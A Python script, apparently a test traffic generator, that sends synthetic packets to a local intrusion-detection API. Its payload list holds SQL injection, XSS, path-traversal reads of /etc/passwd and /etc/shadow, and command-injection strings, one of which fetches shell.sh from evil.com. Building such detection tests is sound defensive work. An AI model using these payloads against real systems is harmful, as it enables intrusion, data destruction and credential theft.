"""
ATIG Packet Simulator - Generates realistic network traffic for testing
"""
import asyncio
import random
import time
import httpx
from typing import List, Dict
from datetime import datetime

class PacketSimulator:
    def __init__(self, api_url: str = "http://localhost:8001"):
        self.api_url = api_url
        self.running = False

        # Simulated network ranges
        self.internal_ips = [f"192.168.1.{i}" for i in range(1, 255)]
        self.external_ips = [
            "8.8.8.8", "1.1.1.1", "208.67.222.222",  # DNS servers
            "151.101.1.140", "185.199.108.153", "140.82.112.3",  # CDNs/GitHub
            "31.13.71.36", "157.240.1.35",  # Instagram/Facebook
            "172.217.166.46", "142.250.185.206",  # Google
        ]
        self.malicious_ips = [
            "45.142.120.67", "185.220.101.1", "91.219.236.166",  # Known bad actors
            "23.129.64.100", "171.25.193.20",  # Tor exit nodes
        ]

        # Attack payloads
        self.attacks = {
            'sql_injection': [
                "UNION SELECT * FROM users",
                "OR 1=1 --",
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "CONCAT(char(117),char(115),char(101),char(114))",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert('XSS')>",
                "javascript:alert(document.cookie)",
                "<body onload=alert('XSS')>",
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "/etc/shadow",
                ".....//.....//etc/passwd",
            ],
            'command_injection': [
                "|cat /etc/passwd",
                "`cat /etc/passwd`",
                "; cat /etc/passwd",
                "$(cat /etc/passwd)",
                "| wget http://evil.com/shell.sh",
            ],
            'brute_force': [
                "SSH password authentication attempt failed",
                "RDP connection attempt - invalid credentials",
                "FTP login failed for user admin",
                "MySQL authentication failure",
            ],
            'normal_traffic': [
                "GET /index.html HTTP/1.1",
                "POST /api/login HTTP/1.1",
                "GET /static/style.css HTTP/1.1",
                "HTTP/1.1 200 OK",
            ]
        }

    def generate_packet(self, attack_type: str = None) -> Dict:
        """Generate a single packet"""
        # Random source and destination
        src_ip = random.choice(self.internal_ips + self.malicious_ips[:2])
        dst_ip = random.choice(self.external_ips + self.internal_ips[:5])

        # Random ports
        src_port = random.randint(1024, 65535)
        dst_port = random.choice([80, 443, 22, 21, 3306, 5432, 8080, 3389])

        # Payload
        if attack_type and attack_type in self.attacks:
            payload = random.choice(self.attacks[attack_type])
        else:
            # Randomly choose between attack and normal traffic (20% attack rate)
            if random.random() < 0.2:
                attack_type = random.choice(list(self.attacks.keys())[:-1])  # Exclude normal
                payload = random.choice(self.attacks[attack_type])
            else:
                payload = random.choice(self.attacks['normal_traffic'])

        return {
            'src_ip': src_ip,
            'dst_ip': dst_ip,
            'src_port': src_port,
            'dst_port': dst_port,
            'protocol': 'tcp',
            'payload': payload
        }

    async def send_packet(self, packet: Dict):
        """Send packet to API for analysis"""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                params = {
                    'src_ip': packet['src_ip'],
                    'dst_ip': packet['dst_ip'],
                    'src_port': packet['src_port'],
                    'dst_port': packet['dst_port'],
                    'protocol': packet['protocol'],
                    'payload': packet['payload']
                }
                response = await client.post(
                    f"{self.api_url}/packet/analyze",
                    params=params
                )
                return response.json()
        except Exception as e:
            print(f"Error sending packet: {e}")
            return None

    async def run(self, duration: int = 60, packets_per_second: int = 5):
        """Run the simulator"""
        self.running = True
        print(f"Starting packet simulator for {duration} seconds...")
        print(f"Packets per second: {packets_per_second}")

        start_time = time.time()
        packet_count = 0

        while self.running and (time.time() - start_time) < duration:
            batch_start = time.time()

            # Send batch of packets
            tasks = []
            for _ in range(packets_per_second):
                packet = self.generate_packet()
                tasks.append(self.send_packet(packet))
                packet_count += 1

            # Wait for all packets to be analyzed
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Count detections
            detections = sum(1 for r in results if r and r.get('analysis'))
            if detections > 0:
                print(f"[{ time.strftime('%M:%S') }] Sent {packets_per_second} packets, {detections} attacks detected")

            # Sleep to maintain target rate
            elapsed = time.time() - batch_start
            if elapsed < 1:
                await asyncio.sleep(1 - elapsed)

        print(f"\nSimulator stopped. Total packets: {packet_count}")
        self.running = False

    def stop(self):
        """Stop the simulator"""
        self.running = False

async def main():
    print("=" * 50)
    print("ATIG Packet Simulator")
    print("=" * 50)

    simulator = PacketSimulator("http://localhost:8001")

    try:
        # Run for 60 seconds, generating 5 packets/sec
        await simulator.run(duration=60, packets_per_second=5)
    except KeyboardInterrupt:
        print("\nStopping simulator...")
        simulator.stop()

if __name__ == "__main__":
    asyncio.run(main())